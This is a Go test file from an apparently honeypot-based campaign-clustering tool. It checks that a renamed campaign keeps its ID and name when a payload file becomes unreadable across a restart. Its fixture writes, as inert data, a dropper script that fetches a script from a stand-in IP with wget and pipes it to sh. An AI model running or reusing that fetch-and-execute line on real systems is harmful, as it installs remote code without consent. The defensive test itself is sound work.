package campaign

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/intel/bazaar"
	"github.com/networkshard/shardlure/internal/store"
	"github.com/networkshard/shardlure/pkg/models"
)

// payloadCampaign writes a small dropper under root, records it as a fetched
// artifact and inserts one file_download of it per actor (distinct sessions),
// so the first tick links the actors through the payload. It returns the
// payload's sha256 and path.
func payloadCampaign(t *testing.T, st *store.Store, root string, actors ...string) (sha, path string) {
	t.Helper()
	body := []byte("#!/bin/sh\ncd /tmp || cd /var/run; wget http://198.51.100.9/x.sh -O- | sh; rm -f x.sh; exit 0\n")
	if len(body) < bazaar.MinSampleBytes {
		t.Fatalf("fixture payload is %d bytes, below the %d-byte link floor", len(body), bazaar.MinSampleBytes)
	}
	sum := sha256.Sum256(body)
	sha = hex.EncodeToString(sum[:])
	path = filepath.Join(root, "dropper.sh")
	if err := os.WriteFile(path, body, 0o600); err != nil {
		t.Fatal(err)
	}
	now := time.Now().UTC()
	if err := st.RecordArtifact(store.Artifact{TS: now, SHA256: sha, LocalPath: path, SizeBytes: int64(len(body)), Status: "fetched",
		Origin: "cowrie_download", URL: "cowrie-download:" + sha}); err != nil {
		t.Fatal(err)
	}
	for i, a := range actors {
		if err := st.InsertEvent(&models.Event{TS: now.Add(-time.Hour), Source: models.SourceCowrie, Kind: models.KindFileDown,
			SessionID: fmt.Sprintf("p%d", i), ActorID: a, SrcIP: "198.51.100.1", SHA256: sha, Filename: "dropper.sh"}); err != nil {
			t.Fatal(err)
		}
	}
	return sha, path
}

// Final audit I-1: the family memo is per process, so the first regroup after
// a restart re-reads every payload file. When that read failed for a reason
// that is not a policy refusal (here EACCES, the auditor's chmod 000; equally
// an evidence directory not mounted yet, EIO, or a failed artifact lookup),
// the payload was left out of the grouping and SaveGrouping replaced
// campaign_ids without it. Once the file was readable again the component
// minted a fresh ID (the edit reserves the old one) and "Dropper" stayed on
// an empty shell. A read failure must carry the value's previous assignment
// forward; only a policy refusal (symlink, hardlink, non-regular file, a path
// outside the root, a generic family) fails closed all the way.
func TestUnreadablePayloadKeepsRenamedCampaign(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("chmod 000 does not stop root from reading")
	}
	st := openStore(t)
	ctx := context.Background()
	root := t.TempDir()
	_, p := payloadCampaign(t, st, root, "cowrie:a", "cowrie:b")
	w := NewWorker(st, 90, root)
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	list, shown := showCampaigns(t, st)
	if len(list) != 1 || list[0].Actors != 2 {
		t.Fatalf("payload campaign: %v", shown)
	}
	id := list[0].ID
	if err := st.AppendCampaignEdit(ctx, id, "rename", "Dropper", "cli"); err != nil {
		t.Fatal(err)
	}
	w.Wake()
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	w.Close() // the process stops: empty memo, lease released

	// A restart while the file cannot be read: the campaign may show no
	// members for the outage, but it keeps its ID and name.
	if err := os.Chmod(p, 0); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(p, 0o600) })
	w2 := NewWorker(st, 90, root)
	t.Cleanup(w2.Close)
	if err := w2.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	list, shown = showCampaigns(t, st)
	if len(list) != 1 || list[0].ID != id || list[0].Name != "Dropper" {
		t.Fatalf("during the outage: %v (want only %s named Dropper)", shown, id)
	}

	// Readable again: the same campaign, not a new ID beside an empty shell.
	if err := os.Chmod(p, 0o600); err != nil {
		t.Fatal(err)
	}
	w2.Wake()
	if err := w2.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	list, shown = showCampaigns(t, st)
	if len(list) != 1 || list[0].ID != id || list[0].Name != "Dropper" || list[0].Actors != 2 {
		t.Fatalf("after recovery: %v (want only %s named Dropper with 2 actors)", shown, id)
	}
}
